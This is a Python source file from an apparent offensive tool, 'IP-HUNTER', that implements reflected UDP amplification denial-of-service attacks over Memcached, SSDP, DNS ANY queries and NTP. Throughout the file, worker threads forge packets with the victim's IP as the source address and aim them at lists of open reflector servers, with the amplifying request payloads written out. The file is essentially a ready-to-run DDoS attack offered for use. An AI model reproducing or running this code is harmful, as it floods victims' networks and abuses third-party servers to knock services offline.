"""
Amplification Attack Classes for IP-HUNTER v2.2.0
Class-based implementation extending AttackBase for unified lifecycle management
"""

import random
import time
import socket
import threading
from typing import Callable, List, Optional
from scapy.all import IP, UDP, DNS, DNSQR, Raw, send
from src.utils.logging import add_system_log
from src.security import stop_event
from src.utils.api_clients import amplification_hunter
from src.attacks.base import AttackBase


class AmplificationAttackBase(AttackBase):
    """Base class for all amplification attacks"""
    
    def __init__(self, target: str, port: int, threads: int = 10, duration: int = 60):
        super().__init__(target, port, threads, duration)
        self.category = "Amplification"
        self.servers: List[str] = []
        self._lock = threading.Lock()

    def _load_servers(self, server_type: str, api_func: Callable, file_path: str) -> bool:
        """Helper to load servers from API or file"""
        add_system_log(f"[dim]AI:[/] Loading {server_type} amplification servers...")
        
        # Try API first
        try:
            self.servers = api_func(limit=100)
        except Exception as e:
            add_system_log(f"[yellow]AI-WARN:[/] API failed for {server_type}: {e}")
            self.servers = []

        # Fallback to file
        if not self.servers:
            try:
                import os
                if os.path.exists(file_path):
                    with open(file_path, 'r') as f:
                        self.servers = [line.strip() for line in f if line.strip()]
                else:
                    add_system_log(f"[red]ERROR:[/] Server file not found: {file_path}")
            except Exception as e:
                add_system_log(f"[red]ERROR:[/] Failed to load servers from {file_path}: {e}")

        if not self.servers:
            add_system_log(f"[bold red]CRITICAL:[/] No {server_type} servers available for attack!")
            return False

        add_system_log(f"[green]AI:[/] Loaded {len(self.servers)} {server_type} servers")
        return True


class MemcachedAmplificationAttack(AmplificationAttackBase):
    """Memcached UDP Amplification Attack (CVE-2018-1000115)"""
    
    def __init__(self, target: str, threads: int = 10, duration: int = 60):
        super().__init__(target, 11211, threads, duration)
        self.attack_name = "Memcached Amplification"
        self.payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

    def _setup_attack(self) -> bool:
        return self._load_servers(
            "Memcached", 
            amplification_hunter.get_memcached_servers,
            'txt/memcached_servers.txt'
        )

    def _create_worker(self) -> Callable:
        def worker():
            while not self.should_stop:
                for server in self.servers:
                    if self.should_stop: break
                    try:
                        pkt = IP(src=self.target, dst=server) / \
                              UDP(sport=random.randint(1024, 65535), dport=self.port) / \
                              Raw(load=self.payload)
                        send(pkt, verbose=False)
                        self.metrics.update(packets=1, bytes_sent=len(pkt))
                    except:
                        continue
        return worker


class SsdpAmplificationAttack(AmplificationAttackBase):
    """SSDP (Simple Service Discovery Protocol) Amplification"""
    
    def __init__(self, target: str, threads: int = 10, duration: int = 60):
        super().__init__(target, 1900, threads, duration)
        self.attack_name = "SSDP Amplification"
        self.payload = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"

    def _setup_attack(self) -> bool:
        return self._load_servers(
            "SSDP",
            amplification_hunter.get_ssdp_servers,
            'txt/ssdp_servers.txt'
        )

    def _create_worker(self) -> Callable:
        def worker():
            while not self.should_stop:
                for server in self.servers:
                    if self.should_stop: break
                    try:
                        pkt = IP(src=self.target, dst=server) / \
                              UDP(sport=random.randint(1024, 65535), dport=self.port) / \
                              Raw(load=self.payload)
                        send(pkt, verbose=False)
                        self.metrics.update(packets=1, bytes_sent=len(pkt))
                    except:
                        continue
        return worker


class DnsAmplificationAttack(AmplificationAttackBase):
    """DNS Amplification Attack using randomized ANY queries"""
    
    def __init__(self, target: str, threads: int = 10, duration: int = 60):
        super().__init__(target, 53, threads, duration)
        self.attack_name = "DNS Amplification"
        self.domains = ["google.com", "facebook.com", "youtube.com", "yahoo.com", "wikipedia.org"]

    def _setup_attack(self) -> bool:
        return self._load_servers(
            "DNS",
            amplification_hunter.get_dns_servers,
            'txt/dns_servers.txt'
        )

    def _create_worker(self) -> Callable:
        def worker():
            while not self.should_stop:
                for server in self.servers:
                    if self.should_stop: break
                    try:
                        domain = random.choice(self.domains)
                        pkt = IP(src=self.target, dst=server) / \
                              UDP(sport=random.randint(1024, 65535), dport=53) / \
                              DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
                        send(pkt, verbose=False)
                        self.metrics.update(packets=1, bytes_sent=len(pkt))
                    except:
                        continue
        return worker


class NtpAmplificationAttack(AmplificationAttackBase):
    """NTP (Network Time Protocol) Amplification"""
    
    def __init__(self, target: str, threads: int = 10, duration: int = 60):
        super().__init__(target, 123, threads, duration)
        self.attack_name = "NTP Amplification"
        self.payload = b"\x17\x00\x03\x2a\x00\x00\x00\x00" + b"\x00" * 40

    def _setup_attack(self) -> bool:
        return self._load_servers(
            "NTP",
            amplification_hunter.get_ntp_servers,
            'txt/ntp_servers.txt'
        )

    def _create_worker(self) -> Callable:
        def worker():
            while not self.should_stop:
                for server in self.servers:
                    if self.should_stop: break
                    try:
                        pkt = IP(src=self.target, dst=server) / \
                              UDP(sport=random.randint(1024, 65535), dport=self.port) / \
                              Raw(load=self.payload)
                        send(pkt, verbose=False)
                        self.metrics.update(packets=1, bytes_sent=len(pkt))
                    except:
                        continue
        return worker


# =============================================================================
# Legacy functions for backward compatibility
# =============================================================================

def memcached_amplification(target, duration, monitor=None):
    """Legacy Memcached UDP Amplification Attack"""
    attack = MemcachedAmplificationAttack(target, threads=1, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], 
            bytes_sent=metrics["bytes_sent"],
            failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def ssdp_amplification(target, duration, monitor=None):
    """Legacy SSDP Amplification Attack"""
    attack = SsdpAmplificationAttack(target, threads=1, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], 
            bytes_sent=metrics["bytes_sent"],
            failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def dns_amplification(target, duration, monitor=None):
    """Legacy DNS Amplification Attack"""
    attack = DnsAmplificationAttack(target, threads=1, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], 
            bytes_sent=metrics["bytes_sent"],
            failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def ntp_amplification(target, duration, monitor=None):
    """Legacy NTP Amplification Attack"""
    attack = NtpAmplificationAttack(target, threads=1, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], 
            bytes_sent=metrics["bytes_sent"],
            failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

